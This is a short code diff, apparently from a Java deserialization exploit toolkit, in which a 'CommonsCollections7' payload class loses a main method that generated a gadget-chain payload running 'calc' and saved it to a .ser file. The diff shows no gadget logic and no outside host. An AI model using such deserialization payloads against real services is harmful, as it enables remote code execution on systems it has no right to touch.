@@ -48,13 +48,4 @@ public class CommonsCollections7 implements ObjectPayload<Hashtable> {
 
         return hashtable;
     }
-
-    public static void main(String[] args) throws Exception {
-        String           cmd    = "calc";
-        String[]         params = new String[]{cmd};
-        byte[]           bytes = (byte[]) CommonsCollectionsK4.class.getMethod("getObject", PayloadType.class, String[].class).invoke(CommonsCollectionsK4.class.newInstance(), PayloadType.qi4l, params);
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 }
